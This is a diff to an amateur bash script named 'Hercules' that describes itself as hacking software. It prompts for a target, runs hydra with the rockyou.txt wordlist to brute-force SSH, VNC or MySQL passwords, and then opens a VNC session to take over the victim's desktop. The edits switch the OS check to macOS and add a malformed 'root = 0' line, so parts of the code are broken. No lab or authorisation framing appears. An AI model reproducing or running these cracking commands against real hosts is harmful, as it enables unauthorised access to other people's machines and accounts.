@@ -1,7 +1,8 @@
 #!/bin/bash
-if [[ "$OSTYPE" == "linux"* ]]; then
+root = 0
+if [[ "$OSTYPE" == "darwin"* ]]; then   
     clear; #clears the terminal
-    if [[ "$EUID" -ne 0 ]]; then #makes the user run this script in root user
+    if [[ "$EUID" -ne $root  ]]; then #makes the user run this script in root user
         echo "Please run as root." #if the user isnt root it says "run as root"
         exit; #stops the program so it does not contiue when its not suppoes to
     else
@@ -19,10 +20,10 @@ if [[ "$OSTYPE" == "linux"* ]]; then
         fi
 
         clear #clears the Terminal
-        
-        Hercules() { #start of the hacking software
-        
-            figlet -f slant "Hercules"
+
+        function Hercules() { #start of the hacking software
+
+            figlet -f slant "Hercules"            
             echo "Type your own number to see what port you want to see"
             read -p "Do you want SSH(22), VNC(5900), MySQL(3306). To see all type (ALL): " service #what the user can choice to see what port is open to crack
 
@@ -44,10 +45,14 @@ if [[ "$OSTYPE" == "linux"* ]]; then
 
             if [[ $service == 5900 ]] || [[ $service == "VNC" ]]; then #makes the user input "NONE" for them to crack prot 5900(VNC)
                 hydra -P rockyou.txt -t 64 -vV -o output.txt -I vnc://$host #Cracks the chocien persons password for 5900(VNC)
+                echo "Loading VNC server." #tells the user that VNC(5900) is loading
+                sleep 1 # wait function 
+                echo "Loading VNC server.." #tells the user that VNC(5900) is loading
+                sleep 1 # wait function 
                 echo "Loading VNC server..." #tells the user that VNC(5900) is loading
-                sleep 3
+                sleep 1 # wait function 
                 open vnc://$host #allows the user to remotly connect to the users Desktop to play with there desktop
-                exit;
+                exit; # stops the porgram
 
             elif [[ $service == 22 ]] || [[ $service == "ssh" ]]; then
                 hydra -l $user -P rockyou.txt -t 64 -vV -o output.txt -I ssh://$host #Cracks the chocien persons password for 22(SSH)
@@ -65,8 +70,8 @@ if [[ "$OSTYPE" == "linux"* ]]; then
             fi
         }
         fi
-        Hercules #end of the function of Hercules
+        Hercules; #end of the function of Hercules
 else
-    clear
+    clear;
     echo "Wrong OS please use the correct OS." #if the users is not useing the right OS it says "You are useing the wrong OS"
 fi
